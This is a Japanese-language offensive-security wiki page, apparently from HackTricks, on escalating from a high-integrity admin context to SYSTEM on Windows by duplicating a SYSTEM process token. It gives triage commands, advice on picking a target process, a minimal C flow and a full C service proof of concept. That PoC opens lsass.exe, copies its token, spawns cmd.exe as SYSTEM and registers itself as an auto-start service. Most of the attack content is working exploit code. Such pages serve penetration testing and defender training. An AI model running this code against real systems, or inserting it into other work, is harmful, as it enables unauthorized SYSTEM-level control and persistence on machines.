# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

このページでは、**High Integrity** コンテキストで既に **`SeDebugPrivilege`** と **`SeImpersonatePrivilege`** を持っている場合に、適切な **SYSTEM** プロセスを開き、**token を複製**し、その token で**新しいプロセスを起動する**、**manual token-theft** バリアントを扱います。

権限のある admin プロセスから素早く `SYSTEM` shell だけ欲しいなら、こちらも確認してください:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

**`SeImpersonatePrivilege`** はあるが process-handle path がない場合は、通常 **named-pipe / Potato** ルートのほうが簡単です:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Quick triage

token-copy path を試す前に、現在の process がすでに有用な context にあることを確認してください:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Notes:

- **`SeDebugPrivilege`** は、**保護されていない** 多くの SYSTEM process を、その DACL が通常はブロックする場合でも開けるようにするものです。
- **`SeImpersonatePrivilege`** は、その後 **`CreateProcessWithTokenW`** を実用的に使えるようにするものです。
- token-copy の経路で得られるのが弱い、または filtered な SYSTEM token だけなら、**別の SYSTEM process** から steal してください。

## Target process を慎重に選ぶ

この technique は通常 **`lsass.exe`** を対象に説明されますが、modern Windows ではそれが **間違った target** であることが多いです:

- **LSA Protection / RunAsPPL** が有効な場合、**`lsass.exe`** は protected であり、`SeDebugPrivilege` を持つ通常の admin process でも open できません。
- **`winlogon.exe`**、**`wininit.exe`**、**`services.exe`**、または初期の **`svchost.exe`** instance のような **non-PPL SYSTEM processes** を優先してください。
- **Protected processes** や、**`System`** または **`csrss.exe`** のような一部の special processes は、この technique の現実的な user-mode target ではありません。
- 権限昇格済みの **Process Hacker / Process Explorer** を使って、duplicate する前に target token が本当に欲しい privileges を持っているか確認してください。

## 実際に重要な API details

多くの public PoC は **`PROCESS_ALL_ACCESS`** と **`TOKEN_ALL_ACCESS`** を要求しますが、それは必要以上に noisy です。実際には:

- target process は必要な rights だけで open してください（一般的には **`PROCESS_QUERY_INFORMATION`** または **`PROCESS_QUERY_LIMITED_INFORMATION`**）。
- token は process creation に必要な rights で open してください: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**。
- **`DuplicateTokenEx(..., TokenPrimary, ...)`** を使って **primary token** を作成してください。impersonation token だけでは新しい process は作成できません。
- **`CreateProcessWithTokenW`** が **`1314`** で失敗する場合は、**`CreateProcessAsUserW`** に切り替えてください。
- **service / Session 0** から起動する場合、**`CreateProcessWithTokenW`** は child を **caller's session** に保持することを忘れないでください。表示される desktop shell が必要なら、**`CreateProcessAsUserW`** を使い、token を目的の session に移してください。

最小限の modern flow は次のようになります:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Full service PoC

以下のコードは、**`SeDebugPrivilege`** と **`SeImpersonatePrivilege`** を悪用して、**SYSTEM として動作しているプロセス**から、**すべての token privileges を持つ token** をコピーします。この場合、コードは **Windows service binary** としてコンパイルして使うことができ、primitive が機能することを確認できます。

**権限昇格が発生する code の主な部分**は、**`Exploit`** function の中にあります。その function 内では、**`lsass.exe`** が検索され、その **token がコピー**され、最後にその token を使って、コピーした token のすべての privileges を持つ新しい **`cmd.exe`** が起動されます。

modern hosts では、**`lsass.exe`** を **`winlogon.exe`**、**`wininit.exe`**、**`services.exe`** のような別の **non-PPL SYSTEM process** に置き換えたいことがよくあります。

SYSTEM として動作し、token privileges のすべて、または大半を持つ他の process は、**`services.exe`**、**`svchost.exe`**（最初のいくつか）、**`wininit.exe`**、**`csrss.exe`** などです... 一般に、**protected process から token をコピーすることはできない**ことを覚えておいてください。
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## References

- [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [Configure added LSA protection (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
